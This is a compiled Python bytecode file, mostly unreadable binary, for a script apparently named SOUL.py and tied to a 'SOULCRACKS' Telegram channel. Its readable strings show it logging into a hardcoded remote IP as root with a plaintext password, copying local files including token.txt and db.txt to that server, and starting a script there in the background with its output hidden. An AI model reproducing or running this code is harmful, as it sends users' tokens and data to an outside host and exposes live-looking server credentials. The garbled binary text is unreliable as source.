�
    *E�f?  �                   ��  � d dl Z d dlZd dlZd dlZdZdZdZg d�Zdd�Z e�   �         Z	de	� �Z
	  ej        d	e� d
e� de� de
� �dd��  �         eD ];Z ej        d	e� de� de� de� de
� de� �dd��  �          ede� de
� de� ��  �         �<dZe
� de� �Z ej        d	e� d
e� de� de
� de� d�dd��  �          ede� de	� d��  �          ed�  �         dS # ej        $ rZ ede� ��  �         Y dZ[dS dZ[ww xY w)�    Nz185.199.52.210�rootzMama@52662@7262)�SOULCRACKS.pyzdb.txtz	token.txt�   c                 �x   �� t           j        �d�                    �fd�t          | �  �        D �   �         �  �        S )N� c              3   �@   �K  � | ]}t          j        ��  �        V � �d S )N)�random�choice)�.0�_�letterss     ��SOUL.py�	<genexpr>z'generate_folder_name.<locals>.<genexpr>   s-   �� � � �A�A�a�6�=��)�)�A�A�A�A�A�A�    )�string�ascii_lowercase�join�range)�lengthr   s    @r   �generate_folder_namer      s8   �� ��$�G��7�7�A�A�A�A�5��=�=�A�A�A�A�A�Ar   z/root/zsshpass -p "z" ssh �@z
 mkdir -p T)�shell�checkz" scp � �:�/z	Uploaded z to r   z "cd z && python3 z > /dev/null 2>&1 &"zScript z started in folder �.zWTo join SOULCRACKS telegram channel for more updates, follow the instructions provided.zError: )r   )�osr	   r   �
subprocess�hostname�username�password�local_filesr   �folder_name�remote_folder_path�run�	file_name�print�script_name�remote_script_path�CalledProcessError�e� r   r   �<module>r.      s�  �� 	�	�	�	� ���� ���� � � � � ������ 7�6�6��B� B� B� B�
 #�"�$�$��+�k�+�+� ���J�N�e�(�e�e�(�e�e�X�e�e�Qc�e�e�mq�y}�~�~�~�~� !� K� K�	��
��x�h�x�x�i�x�x�(�x�x�X�x�x�Xj�x�x�mv�x�x�  AE�  MQ�  	R�  	R�  	R�  	R���I�)�I�I�);�I�I�i�I�I�J�J�J�J� "�K�.�>�>��>�>���J�N�  U�(�  U�  U�(�  U�  U�X�  U�  U�L^�  U�  U�l~�  U�  U�  U�  ]a�  im�  n�  n�  n�  n�	�E�
B�K�
B�
B�K�
B�
B�
B�C�C�C�	�E�
c�d�d�d�d�d���$� � � �	�E�-�A�-�-�����������������s   �B&C �
C:�!C5�5C: